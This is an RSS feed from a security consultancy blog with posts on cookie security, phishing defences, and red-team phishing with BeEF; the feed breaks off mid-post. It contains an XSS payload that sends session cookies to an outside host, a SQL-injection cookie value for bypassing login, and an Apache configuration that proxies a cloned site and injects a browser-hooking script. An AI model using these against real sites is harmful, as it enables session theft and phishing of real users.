<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>Portcullis Labs &#187; phishing</title>
	<atom:link href="https://portcullislabs.github.io/tag/phishing/feed/" rel="self" type="application/rss+xml" />
	<link>https://portcullislabs.github.io</link>
	<description>Research and Development</description>
	<language>en-US</language>
		<sy:updatePeriod>hourly</sy:updatePeriod>
		<sy:updateFrequency>1</sy:updateFrequency>
	<generator>http://wordpress.org/?v=3.8.5</generator>
	<item>
		<title>Keep your cookies safe (part 2)</title>
		<link>https://portcullislabs.github.io/blog/keep-your-cookies-safe-part-2/</link>
		<comments>https://portcullislabs.github.io/blog/keep-your-cookies-safe-part-2/#comments</comments>
		<pubDate>Thu, 15 Feb 2018 20:31:26 +0000</pubDate>
		<dc:creator><![CDATA[DMG]]></dc:creator>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[phishing]]></category>
		<category><![CDATA[SDL]]></category>
		<category><![CDATA[training]]></category>
		<category><![CDATA[web]]></category>

		<guid isPermaLink="false">https://portcullislabs.github.io/?p=3960</guid>
		<description><![CDATA[<p>In the first blog post we talked about the dangers that your cookies are exposed. Now it is time to keep your cookies safe. Time to know what protection mechanisms there are, how to use them and why. How to read this post? The flowchart below will guide you to the process to check if [&#8230;]</p><p>The post <a href="https://portcullislabs.github.io/blog/keep-your-cookies-safe-part-2/">Keep your cookies safe (part 2)</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>In the <a title="first blog post" href="/blog/keep-your-cookies-safe-part-1/">first blog post</a> we talked about the dangers that your cookies are exposed. Now it is time to keep your cookies safe. Time to know what protection mechanisms there are, how to use them and why.<span id="more-3960"></span></p>
<h2>How to read this post?</h2>
<p>The flowchart below will guide you to the process to check if your cookies are well protected. Note that there are more factors and cases that could potentially compromise your cookies (as we talked in the part 1 of the blog post).</p>
<p>Of course at the end of the post you will find the explanation to the flowchart. So if you do not understand anything, do not panic! Look for the question in the last part of the blog where it will be explained.</p>
<div id="attachment_3964" style="width: 466px" class="wp-caption aligncenter"><a name="imageclose-3961"><div class="lb-album"><a href="#image-3961"><img src="https://portcullislabs.github.io/wp-content/uploads/2014/02/cookies_flowchart-456x1024.png" alt="flowchart about securing cookies" class="size-large wp-image-3964  "><span></span></a></div>              
<a href="#imageclose-3961" class="css3lightbox-close">
				   <div class="lb-overlay" id="image-3961">
                   <img src="https://portcullislabs.github.io/wp-content/uploads/2014/02/cookies_flowchart.png" alt="image-3961">
                   </div></a><p class="wp-caption-text">A flowchart about how to get your cookies better secured.</p></div>
<h3>Is your session cookie different before and after login?</h3>
<ul>
<li>Correct answer: Yes, if your unique session ID cookie is different after and before login, your session is correctly protected against Session Fixation attacks</li>
<li>Incorrect answer: No, your unique session ID cookie is the same, if an attacker managed to stole your cookie before login into the web application, then once you are authenticated the attacker could also access the application</li>
</ul>
<p>Recommendation: Session ID should be changed after and before user logs in.</p>
<h3>Are you invalidating the session when the user logs out?</h3>
<ul>
<li>Correct answer: Yes, once the user has logged out, the session must be destroyed or invalidated</li>
<li>Incorrect answer: No, if you do not destroy the session ID in server side, the session will continue being valid</li>
</ul>
<p>Recommendation: Session must be invalidated after the user logs out.</p>
<h3>Does your cookie have the attribute &#8220;HttpOnly&#8221;?</h3>
<ul>
<li>Correct answer: Yes, your cookie is only accessible via http and not via JavaScript</li>
<li>Incorrect answer: No, your cookie is also accessible via JavaScript , which in case of an attacker compromise your application with a Cross-site Scripting, it could access to your cookie</li>
</ul>
<p>Recommendation: Set the cookie as &#8220;HttpOnly&#8221;.</p>
<h3>Does your cookie have the full domain attribute set?</h3>
<ul>
<li>Correct answer: Yes, your cookie is only being sent to the correct domain where it is needed</li>
<li>Incorrect answer: No, your cookie can be sent to the multiple sub-domains you could have</li>
</ul>
<p>Recommendation: The full domain of the cookie must be specified.</p>
<h3>Does your cookie have an adequate lifetime?</h3>
<ul>
<li>Correct answer: Yes</li>
<li>Incorrect answer: No, Cookies with an excessive lifetime will not be deleted when the user closes their browser and would therefore be exposed should an attacker manage to compromise the user&#8217;s system</li>
</ul>
<p>Recommendation: Use cookies without a lifetime so that they are deleted once the user closes their browser or lower its lifetime to meet business requirements.</p>
<h3>Do you have only one web application in the same domain?</h3>
<p>What does this question mean? The following is an example of multiple web applications in the same domain:</p>
<ul>
<li>www.mydomain.com/app1</li>
<li>www.mydomain.com/app2</li>
<li>www.mydomain.com/app3</li>
</ul>
<p>There is not a correct answer to this question.</p>
<p>If you only have one application running over the same domain, you should not need to care about this issue. However if you host multiple web applications, you need to set the attribute &#8220;path&#8221; of the cookie to ensure that the cookie is only being sent to the web application it belongs.</p>
<h3>Are your cookies NOT storing sensitive information?</h3>
<ul>
<li>Correct answer: Yes, my cookies do not contains sensitive information</li>
<li>Incorrect answer: No, there are some sensitive information in the cookies</li>
</ul>
<p>Recommendation: Ensure that sensitive information is not stored in the cookies.</p>
<h3>Does your web application support HTTPS?</h3>
<p>If the answer to this question is NO, you are sending all the data through a plain text protocol. An attacker able to intercept network traffic between a user&#8217;s session and the web server could capture the sensitive data being transmitted.</p>
<p>If the answer is YES, there is some other question you need to answer before know if you are protecting correctly your cookies:</p>
<h3>Does your web application use HTTP + HTTPS (mixed content)?</h3>
<p>If the answer is NO, it means that HTTP is not allowed and all the data is being sent over HTTPS. Although your cookie is secure in this case, you need to be careful if you enable HTTP.</p>
<p>If the answer is YES you need to answer one more question:</p>
<h3>Is HSTS (HTTP Strict Transport Security) enabled or has the cookie the attribute &#8220;secure&#8221;?</h3>
<p>If you have HSTS enabled, you are forcing all the data being sent over HTTPS (cookies included).</p>
<p>If the cookie has the attribute &#8220;secure&#8221;, you are forcing the cookie to be sent <strong>only</strong> over HTTPS.</p>
<p>Recommendation: Set the cookie as &#8220;secure&#8221; and consider to enable HSTS.</p>
<p>The post <a href="https://portcullislabs.github.io/blog/keep-your-cookies-safe-part-2/">Keep your cookies safe (part 2)</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://portcullislabs.github.io/blog/keep-your-cookies-safe-part-2/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>A study in scarlet</title>
		<link>https://portcullislabs.github.io/blog/a-study-in-scarlet/</link>
		<comments>https://portcullislabs.github.io/blog/a-study-in-scarlet/#comments</comments>
		<pubDate>Thu, 20 Jul 2017 12:28:58 +0000</pubDate>
		<dc:creator><![CDATA[TDR]]></dc:creator>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[analysis]]></category>
		<category><![CDATA[blue team]]></category>
		<category><![CDATA[phishing]]></category>
		<category><![CDATA[red team]]></category>

		<guid isPermaLink="false">https://portcullislabs.github.io/?p=5917</guid>
		<description><![CDATA[<p>In the modern age, where computers are used for nearly everything we do, the damage that can be caused to a company by cyber-attacks is substantial, with companies losing millions in regulatory fines, compensation and declining share prices. While some of these breaches have been caused by vulnerabilities within the target company&#8217;s infrastructure/software, a large [&#8230;]</p><p>The post <a href="https://portcullislabs.github.io/blog/a-study-in-scarlet/">A study in scarlet</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>In the modern age, where computers are used for nearly everything we do, the damage that can be caused to a company by cyber-attacks is substantial, with companies losing millions in regulatory fines, compensation and declining share prices. While some of these breaches have been caused by vulnerabilities within the target company&#8217;s infrastructure/software, a large quantity of them began with a phishing attack.<span id="more-5917"></span></p>
<p>Generally speaking, phishing is a social engineering technique that involves sending fraudulent emails to individuals in an attempt to coerce them into providing confidential information or network access. Spear phishing is a more targeted form of this, where attackers will target specific individuals within an organisation and use information gathered from publicly available resources, such as social media, to make the malicious emails seem more genuine. This attack technique is very effective, with previous research showing victims being up to 4.5 times more likely to believe the contents of targeted emails. Additionally, targeting specific individuals with more access within an organisation, such as managers or system administrators, gives the attacker a greater chance of finding sensitive information than that provided by standard phishing.</p>
<p>The best defence against phishing attacks is to have employees that are aware of the threat and the methods of identifying them. That being said, it&#8217;s important to support your employees in this effort, minimising risk and the potential for human error, which is why employers should be doing everything they can to ensure that the emails do not reach their targets and, when they do, that they are easy to identify and report. This can be achieved by looking at the cyber kill chain, as documented by Lockheed Martin, and implementing sensible security controls at each of the stages that relate specifically to a phishing attack.</p>
<h2>Delivery</h2>
<p>The first part of the cyber kill chain where we can actively identify these attacks is at the delivery stage &#8211; when a malicious email hits the external mail server of an organisation. The following security controls can be put in place at this stage of an attack to identify and mitigate the majority of phishing attacks.</p>
<h3>Mail content scanning</h3>
<p>The most obvious place to search for indicators of a phishing attempt is the content of the emails themselves. By analysing information gathered about common attacks used by malicious actors, it is possible to identify potential phishing attacks before they reach the intended target. The contents of these emails can then be modified to make it easier for users to identify them.</p>
<p>As attackers use phishing as a method of gaining unauthorised access to systems or data, a common attack vector is to include a hyperlink to a web application that they control. Modern mail clients capable of rendering HTML emails make this attack method even more effective, as attackers are able to change the text that is displayed to the user in place of the hyperlink. To help the user identify the threat and limit the risk of this method of attack, hyperlinks should be rewritten to display to the user where their browser will take them if they click on the link.</p>
<p>As phishing attempts will generally come from a network location external to their intended targets, another very simple but effective method of improving a user&#8217;s likelihood of identifying a phishing attack is the addition of a warning to the email, stating that it is from an external user. Users seeing that emails have come from an external location are much more likely to exercise caution when following hyperlinks.</p>
<h3>Attachments</h3>
<p>Malicious attachments sent via phishing email are a very real and dangerous threat as, at worst, they could allow an attacker to bypass all external protections and provide them with direct access to a company&#8217;s internal network. The most secure method to avoid the risk of this threat would be to block all email attachments coming into a company, however, for the majority of businesses this is not practical and would severely limit their ability to communicate with clients/third-parties. The following security controls can help to mitigate the potential damage that could be caused by malicious attachments:</p>
<ul>
<li>File rewrite &#8211; a number of security solutions on the market are able to convert files into a safe format, for example, rewriting a Microsoft Docx file into a PDF so that no Macros can be executed</li>
<li>Moderator review &#8211; One very effective method of mitigating this threat is to hold all emails from external addresses that contain attachments in a quarantine system until they have undergone administrator review. This will allow them to examine the contents of the emails to determine whether or not they are malicious</li>
<li>Password protected attachments &#8211; As security solutions have no feasible way of decrypting password protected files, there is no way of automatically validating the whether or not their content is malicious. Due to this, it is important to make sure they are either blocked from entering your organisation or, if there is a business requirement for such attachments, at a minimum they should undergo sandboxing or moderator review</li>
</ul>
<h3>Domain names</h3>
<p>A common attack technique used to trick users into providing sensitive information is to use a domain that is close to a company&#8217;s legitimate domain. In order to counter this type of attack, security solutions can be employed to review how similar a sending domain is to the company&#8217;s legitimate domain, blocking emails from all domains that are above a certain level of similarity.</p>
<p>Another attack technique that has been discussed a large amount recently is the use of Internationalised Domain Names (IDN). IDNs are domain names that contain at least one character that is not within the normal ASCII character set. In order to facilitate this, domains can be registered as specially formatted ASCII strings, which are preceded by the characters &#8220;xn--&#8221;. This representation is what is actually registered with domain providers and is called Punycode. Using IDNs, attackers can register domains that look very similar to legitimate sites by changing ASCII characters for Unicode characters (e.g. www.goógle.com could be registered using the Punycode www.xn--gogle-1ta.com). As these IDN domains are actually registered using the Punycode for the domain name, mitigating the threat of this attack technique can be achieved by blocking all domain names that begin with the characters &#8220;xn--&#8221;.</p>
<p>A further way of using a domain to identify malicious activity is to analyse what it appears to be used for. A number of security solutions on the market assign categories to domains, usually based on analysis of the services running on the systems (e.g. the content that is hosted on a web server). Using these solutions, it is also possible to report domains that have been identified as being used in phishing or other malicious activities. As the majority of these solutions operate using a cloud based central server, once a domain has been marked as malicious it will be impractical for attackers to use it in further attacks. Additionally, as attackers are unlikely to want to have their personal details registered to accounts for use in these services, it is likely that they will be unable to have their domains categorised when they set up their phishing. Blocking emails from domains that are not yet categorised can be just as effective at ensuring that phishing attempts do not reach their target.</p>
<h3>Email validation</h3>
<p>The wide range of open source software available to us makes it simple to set up and use a mail server for a domain of our choosing. This, however, provides attackers with the opportunity to send emails as if they were coming from a legitimate site &#8211; name@yourcompanynamehere.com for example. A number of technologies are available that will help to ensure that attackers are not able to spoof emails in this way:</p>
<ul>
<li>Sender Policy Framework (SPF) &#8211; SPF is an email validation system which allows domain administrators to define the hosts that are allowed to send emails for their domain, through the use of a specially formatted DNS TXT record:</li>
</ul>
<div id="attachment_5920" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-5918"><div class="lb-album"><a href="#image-5918"><img src="https://portcullislabs.github.io/wp-content/uploads/2017/07/SPF-300x90.jpg" alt="An example SPF record entry" class="size-medium wp-image-5920"><span></span></a></div>              
<a href="#imageclose-5918" class="css3lightbox-close">
				   <div class="lb-overlay" id="image-5918">
                   <img src="https://portcullislabs.github.io/wp-content/uploads/2017/07/SPF.jpg" alt="image-5918">
                   </div></a><p class="wp-caption-text">An example SPF record entry</p></div>
<ul>
<li>Domain Keys Identified Mail (DKIM) &#8211; DKIM also uses a specially formatted DNS TXT record to validate the sender of an email, through the use of public/private key cryptography. The sending mail server adds a digital signature to outgoing emails, which can be verified using a public key that is published within the DNS record. This email validation method also provides data integrity for the emails, as any alterations made in transit will affect the validation of the digital signature.</li>
</ul>
<div id="attachment_5921" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-5919"><div class="lb-album"><a href="#image-5919"><img src="https://portcullislabs.github.io/wp-content/uploads/2017/07/DKIM-1-300x69.jpg" alt="An example DKIM signature in an email header" class="size-medium wp-image-5921"><span></span></a></div>              
<a href="#imageclose-5919" class="css3lightbox-close">
				   <div class="lb-overlay" id="image-5919">
                   <img src="https://portcullislabs.github.io/wp-content/uploads/2017/07/DKIM-1.jpg" alt="image-5919">
                   </div></a><p class="wp-caption-text">An example DKIM signature in an email header</p></div>
<ul>
<li>Domain-based Message Authentication, Reporting and Conformance (DMARC) &#8211; DMARC takes the 2 validation systems defined above and builds on them to create a much more robust system. It allows domain administrators to define which validation systems are to be used by mail servers for the domain (either SPF, DKIM or both) and how mail servers should handle emails that do not pass the validation process.</li>
</ul>
<p>By utilising these security controls and ensuring that our receiving mail server is checking the DNS records against the information in emails, we are able to ensure that attackers are unable to spoof emails from legitimate domains.</p>
<h3>Malicious email reporting</h3>
<p>If a malicious email does manage to get through all of the security controls at the perimeter, it is likely that at least some of their intended targets will fall for the scam. With that in mind, it is important that users have a method of notifying the people responsible for the security of your organisation that a malicious email has slipped through the net. Multiple solutions for this are available, such as the creation of a plugin for the company mail client or a mailing list that is used to report malicious emails. In tandem to this, policies and procedures should be put into place, which detail the process administrators and security staff should follow to inform employees that there is a phishing attack underway and how to identify it.</p>
<div id="attachment_5922" style="width: 231px" class="wp-caption alignnone"><a name="imageclose-5920"><div class="lb-album"><a href="#image-5920"><img src="https://portcullislabs.github.io/wp-content/uploads/2017/07/DKIM-2.jpg" alt="Mail client plugin" class="size-full wp-image-5922"><span></span></a></div>              
<a href="#imageclose-5920" class="css3lightbox-close">
				   <div class="lb-overlay" id="image-5920">
                   <img src="https://portcullislabs.github.io/wp-content/uploads/2017/07/DKIM-2.jpg" alt="image-5920">
                   </div></a><p class="wp-caption-text">Mail client plugin</p></div>
<h2>Exploitation, installation and command &amp; control</h2>
<p>A number of security controls can be used to mitigate the threat of phishing attacks across the next 3 stages of the cyber kill chain &#8211; Exploitation, Installation and Command &amp; Control. If an attack has managed to progress this far along the cyber kill chain it is imperative that it is identified and stopped to ensure that the attacker is not able to gain a foothold on an internal network.</p>
<h3>End point protection</h3>
<p>The most obvious method of blocking malicious applications from running on a target user&#8217;s system is to install an End Point Protection application. There are a number of options for this on the market, each of them able to detect and protect against millions of variants of malware and other unwanted applications. These products can help to stop an attack at either the Exploitation or Installation stages of the cyber kill chain by identifying and blocking malicious files/activity.</p>
<h3>Outbound proxies</h3>
<p>A common method of attack used in phishing attempts is to provide a link within the email that, when followed, will display a page asking for credentials or other sensitive information. In order to stop attackers using this technique, a network proxy can be used to block traffic to unknown domains. One possible solution to this issue is to only allow access to the top ranked sites, however, for some organisations this may not be practical. In situations such as this, a moderator/administrator should review any unknown domains to ensure that they are not malicious.</p>
<p>In addition to mitigating the threat of users disclosing sensitive information, these solutions can help to break the cyber kill chain at the installation and command &amp; control (C2) stages, by stopping malware from using HTTP connections to unknown domains to download Remote Access Tools (RATs) or as a C2 channel.</p>
<h3>Sandboxing</h3>
<p>Sandboxing is the practice of using a system that is not connected to the live network (usually a virtual machine) to test files for malicious activity. As most attachments used in phishing attacks will have similar behaviour (e.g. connecting back to a command &amp; control node) after being opened, sandboxing can be used to identify them within a safe environment to ensure that no live systems are affected. By using sandboxing technologies we can analyse the behaviour of files against indicators of malicious activity at all three of the stages of the kill chain.</p>
<h2>Threat intelligence</h2>
<p>While having all of the security solutions described above can help to identify and mitigate the threat of phishing attacks, the individuals behind the attacks are always developing and adapting their methodologies. Taking this into account, it is of utmost importance that the indicators of attack that we are looking for evolve with them. By feeding any information gathered from previous attacks into cloud-based threat intelligence platforms, the security community&#8217;s understanding of how attackers are operating will grow, which will in turn improve our ability to stop them.</p>
<h2>Summary</h2>
<p>While the threat of phishing attacks and the damage they can do is significant, both financially and to a company&#8217;s reputation, by looking at the timeline of these attacks it is possible to identify many security controls that can be used to mitigate them. By utilising these controls, through a defence-in-depth approach to security, we are able to limit the number of malicious emails that reach their targeted users. Furthermore, by using information about recognised indicators of attack, we are able to alter the contents of emails to assist users in the identification of emails and content that could potentially cause a security breach.</p>
<p>The post <a href="https://portcullislabs.github.io/blog/a-study-in-scarlet/">A study in scarlet</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://portcullislabs.github.io/blog/a-study-in-scarlet/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>Keep your cookies safe (part 1)</title>
		<link>https://portcullislabs.github.io/blog/keep-your-cookies-safe-part-1/</link>
		<comments>https://portcullislabs.github.io/blog/keep-your-cookies-safe-part-1/#comments</comments>
		<pubDate>Fri, 22 Apr 2016 15:03:32 +0000</pubDate>
		<dc:creator><![CDATA[DMG]]></dc:creator>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[phishing]]></category>
		<category><![CDATA[SDL]]></category>
		<category><![CDATA[training]]></category>
		<category><![CDATA[web]]></category>

		<guid isPermaLink="false">https://portcullislabs.github.io/?p=3605</guid>
		<description><![CDATA[<p>What are cookies and why are they important? A cookie is a small piece of data sent from a web site and stored in a user&#8217;s web browser and is subsequently includes with all authenticated requests that belong to that session. Some cookies contain the user session data in a web site, which is vital. [&#8230;]</p><p>The post <a href="https://portcullislabs.github.io/blog/keep-your-cookies-safe-part-1/">Keep your cookies safe (part 1)</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>What are cookies and why are they important?<span id="more-3605"></span></p>
<p>A cookie is a small piece of data sent from a web site and stored in a user&#8217;s web browser and is subsequently includes with all authenticated requests that belong to that session. Some cookies contain the user session data in a web site, which is vital. Others cookies are used for tracking long-term records of an individuals browsing history and preferences such as their preferred language. Sometimes they are also used for tracking and monitoring a user&#8217;s activities across different web sites.</p>
<p>Due to the fact that HTTP is a stateless protocol, the web site needs a way to authenticate the user in each request. Every time the user visits a new page within a web site, the browser sends the users cookie back to the server, allowing the server to serve the correct data to that individual user, which is tracked using a session ID. Cookies therefore play an integral part in ensuring persistence of data used across multiple HTTP requests throughout the time a user visits a web site.</p>
<p>What does a cookie look like?</p>
<pre class="brush: php; gutter: false; title: ; notranslate">
Set-Cookie: __cfduid=d8a3ae94f81234321; expires=Mon, 23-Dec-2019 23:50:00 GMT; path=/; domain=.domain.com; HttpOnly
</pre>
<p>The cookie below is an example of a common cookie generated for WordPress. Here we break down each part of the cookie and explain what it is used for:</p>
<ul>
<li>Set-Cookie &#8211; the web server asks the browser to save the cookie with this command</li>
<li>__cfduid=d8a3ae94f81234321;: This is the cookie itself. At the left of the equals symbol is the name of the cookie and to the right is its value</li>
<li>expires=Mon, 23-Dec-2019 23:50:00 GMT; &#8211; this is the date and time when the cookie will expire</li>
<li>path=/; domain=.domain.com; &#8211; the cookie domain and path define the scope of the cookie. They tell the browser that cookies should only be sent back to the server for the given domain and path</li>
<li>HttpOnly &#8211; this attribute (without a value associated) tells the browser that JavaScript cannot be used to access the cookie, which must only be accessed through HTTP or HTTPS. Sometimes you will also see the attribute &#8220;Secure&#8221;, which prevents the cookie being sent over the unencrypted HTTP protocol (i.e. the cookie will only be transmitted over HTTPS)</li>
</ul>
<p>What is the impact of having your cookies compromised?</p>
<p>A traditional and important role of a cookie is to store a users session ID, which is used to identify a user. If this type of cookie is stolen by a malicious user, they would be able to gain access to web site as the user for which the cookie belonged to (i.e. the malicoius user would have access to your account within the web site).</p>
<p>In the case of the tracking cookie, the malicious user would have access to your browsing history for the web site.</p>
<p>Another problem arises when sensitive data is stored in cookies, for example a username, and this is also a vector for server side exploitation if its contents are not properly validated, which can potentially lead to serious vulnerabilties such as SQL Injection or remote code execution.</p>
<p>What are the main cookie threats?</p>
<div id="attachment_3785" style="width: 310px" class="wp-caption aligncenter"><a href="http://www.flickr.com/photos/somegeekintn/" target="_blank"><img class="size-medium wp-image-3785  " title="Cookie Monster" alt="cookie monster image" src="https://portcullislabs.github.io/wp-content/uploads/2014/02/cookie_monster-300x198.jpg" width="300" height="198" /></a><p class="wp-caption-text">Cookie Monster.</p></div>
<p>There are different attacking vectors in which obtaining and modifying cookies can occur, leading to session hijacking of an authenticated user session, or even SQL injection attacks against the server. These threats may take place when an attacker takes control of the web browser using Cross-site Scripting, or Spyware, in order to obtain a users SessionID cookie that can then be used by an attacker to impersonate the legitimate user, as shown in the following example:</p>
<p>Obtaining access to the cookie can be as easy as using the following JavaScript line:</p>
<pre class="brush: jscript; gutter: false; title: ; notranslate">
document.cookie
</pre>
<p>Imagine that the web site has a search form that is vulnerable to Cross-site Scripting (Reflective Cross-site Scripting in this case). </p>
<pre class="brush: plain; gutter: false; title: ; notranslate">

http://myweb.com/form.php?search=XSS_PAYLOAD_HERE

</pre>
<p>An attacker could use the following payload to send the cookie to an external web site:</p>
<pre class="brush: xml; gutter: false; title: ; notranslate">
&amp;lt;script&amp;gt;location.href='http://external_web site.com/cookiemonster.php?c00kie='+escape(document.cookie);&amp;lt;/script&amp;gt;
</pre>
<p>The final step would be to send the vulnerable link to an admin and wait for them to click on it. If the attacker uses an URL shortener, this allows for further obfuscation of the malicous URL, as the admin will be unable to see the content of the link they have been sent.</p>
<p>An attacker able to read files from a given user may also attempt to retrieve the cookies stored in files from a system. Furthermore some browsers store  persistent cookies in a binary file that is easily readable with existing <a title="public tools" href="http://securitylearn.net/wp-content/uploads/tools/iOS/BinaryCookieReader.py">public tools</a>.</p>
<p>Security weaknesses may also reside server side when cookies are modified, if input validation routines are not adequately implemented. The example below shows how to bypass the authentication process:</p>
<pre class="brush: php; gutter: false; title: ; notranslate">
//In /core/user.php: (cs cart vulnerability)

if (fn_get_cookie(AREA_NAME . '_user_id')) {
 $udata = db_get_row(&quot;SELECT user_id, user_type, tax_exempt, last_login, membership_status, membership_id FROM $db_tables[users]
 WHERE user_id='&quot;.fn_get_cookies(AREA_NAME . '_user_id').&quot;' AND password='&quot;.fn_get_cookie(AREA_NAME . '_password').&quot;'&quot;);
 fn_define('LOGGED_VIA_COOKIE', true);

}

//Cookie: cs_cookies[customer_user_id]=1'/*;
</pre>
<p>For their role, cookies are really important and may be used in different attacks.</p>
<p>Now that you are more aware of the dangers, it would be wise to ensure steps are taken to deploy web site cookies safely and securely. Look out for the second part of this post!</p>
<p>The post <a href="https://portcullislabs.github.io/blog/keep-your-cookies-safe-part-1/">Keep your cookies safe (part 1)</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://portcullislabs.github.io/blog/keep-your-cookies-safe-part-1/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>Blood in the water: Phishing with BeEF</title>
		<link>https://portcullislabs.github.io/blog/blood-in-the-water-phishing-with-beef/</link>
		<comments>https://portcullislabs.github.io/blog/blood-in-the-water-phishing-with-beef/#comments</comments>
		<pubDate>Fri, 18 Sep 2015 09:53:47 +0000</pubDate>
		<dc:creator><![CDATA[TMB]]></dc:creator>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[exploit]]></category>
		<category><![CDATA[phishing]]></category>
		<category><![CDATA[red team]]></category>

		<guid isPermaLink="false">https://portcullislabs.github.io/?p=4939</guid>
		<description><![CDATA[<p>Those of you that have been following the UK infosec market recently will have noticed an upturn in talk relating to &#8220;Red Team&#8221; style engagements. Unlike a traditional penetration test, the object of such an exercise is not to locate vulnerabilities (though of course that helps) but rather to exercise the &#8220;Blue Team&#8221; i.e. the [&#8230;]</p><p>The post <a href="https://portcullislabs.github.io/blog/blood-in-the-water-phishing-with-beef/">Blood in the water: Phishing with BeEF</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>Those of you that have been following the UK infosec market recently will have noticed an upturn in talk relating to &#8220;Red Team&#8221; style engagements. Unlike a traditional penetration test, the object of such an exercise is not to locate vulnerabilities (though of course that helps) but rather to exercise the &#8220;Blue Team&#8221; i.e. the internal users at an organisation responsible for defending their network. This change has been driven by <a title="CBEST" href="http://www.bankofengland.co.uk/financialstability/fsc/Pages/cbest.aspx">CBEST</a> and the associated <a title="STAR exam" href="http://www.crest-approved.org/crest-member-companies/members-supplying-star-services/index.html">STAR exam</a> offerings from CREST, which have certainly raised the bar. Whilst most IT security consultancies are happy to talk about phishing, the level to which they go to mimic the target can vary.<span id="more-4939"></span></p>
<p>Historically, the Portcullis offering has, whilst bespoke been more about gathering statistics as to how many victims clicked a given link than much else. With this in mind, over the last 12 months, I&#8217;ve set about developing our service in a more agressive direction. One particular idea I&#8217;ve wanted to deliver for a while is to integrate <a title="BeEF" href="http://beefproject.com/">BeEF</a> into our offering. As an aside, for those of you that don&#8217;t know of BeEF, it allows you to hook web site vistors and turn them into drones. This allows for longer term exploitation of their browsers including fingerprinting and even RCE enabling OS level access to their PCs.</p>
<p>As I&#8217;ve already stated, Portcullis offer a bespoke phishing service where we tailor the web site and email to the particulars of our client. For a start we will perform reconnaissance to locate a suitable legitimate web site to mimic and secondly we will work with our client to ensure that our emails aren&#8217;t caught by any anti-phishing technology they may be using (often the first point of failure when phishing a mature organisation). Typically, we will then mimic our chosen site on a similar looking domain before sending emails to our victims. Historically, we&#8217;ve statically cloned the legitimate site (or at least the portions we need) before tweaking them to add our hooks, however on a recent project, I took the opportunity to improve this. The reasons for the change were many and varied but essentially came down to the fact that a statically cloned site will never look as good as the real thing, notably with respect to the expected functionality a victim might expect to see, but also because the tweaks we will then have to make are quite time consuming. The aim of my improvements were therefore two-fold:</p>
<ul>
<li>Allow dynamic web sites to be cloned</li>
<li>Integrate BeEF</li>
</ul>
<p>Whilst I&#8217;ve previously looked, I&#8217;ve not found any information elsewhere that discusses how to do this in detail, so I decided to use Apache web server, mod_proxy and mod_substitute (tools I&#8217;m already familiar with). The remainder of this post discussed the approach I took.</p>
<p>Consider the following configuration:</p>
<pre class="brush: xml; highlight: [2,12,13,16]; title: ; notranslate">
        ServerName HOSTNAME.DOMAINNAME
        DocumentRoot /var/www/HOSTNAME.DOMAINNAME
        ...
        ProxyPass /pcslhook.js !
        ProxyPass /pcslendpoint.php !
        ProxyPass /hook.js http://localhost:3000/hook.js
        ProxyPassReverse /hook.js http://localhost:3000/hook.js
        ProxyPass /dh http://localhost:3000/dh
        ProxyPassReverse /dh http://localhost:3000/dh
        ProxyPass /ui http://localhost:3000/ui
        ProxyPassReverse /ui http://localhost:3000/ui
        ProxyPass / http://PLEASECOMPLETEME/
        ProxyPassReverse / http://PLEASECOMPLETEME/
        AddOutputFilterByType INFLATE;SUBSTITUTE;DEFLATE text/html
        AddOutputFilterByType INFLATE;SUBSTITUTE;DEFLATE text/javascript
        Substitute &quot;s#&lt;head&gt;#&lt;head&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;\&quot;/pcslhook.js\&quot;&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt;load();&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;\&quot;/hook.js\&quot;&quot;&gt;&lt;/script&gt;#ni&quot;
        Substitute &quot;s#:3000##ni&quot;
        Substitute &quot;s#\&quot;3000\&quot;#\&quot;80\&quot;#ni&quot;
        Substitute &quot;s#@PLEASECOMPLETEME#@PLEASECOMPLETEME#ni&quot;
</pre>
<p>We start off by defining the ServerName on line 2. This will typically be based on the domain name that we control e.g. if the organisation we are targeting is example.org, we might register example.com. We then configure the real web site on lines 12 and 13. Any request for example.com will therefore be rewritten and proxied by our web server instance to example.org. This means that, for example that if a victim performs a search on our web site, then requests for http://example.com/search?query=test will be relayed to http://example.org/search?query=test and the victim will get identical results to those they would have received on the legitimate web site. Finally, we inject BeEF on line 16. I&#8217;ve found that the best approach is to pick a unique snippet of HTML (one that appears only once in each page) and use this as the anchor for my substitution.</p>
<p>Whilst this forms the basis of our subterfuge, what of the other lines in our example configuration?</p>
<ul>
<li>We use ProxyPass &#8230; ! when we want to process requests from our own web root (/var/www/HOSTNAME.DOMAINNAME)</li>
<li>We use ProxyPass &#8230; http://localhost:3000/&#8230; to proxy requests through to BeEF</li>
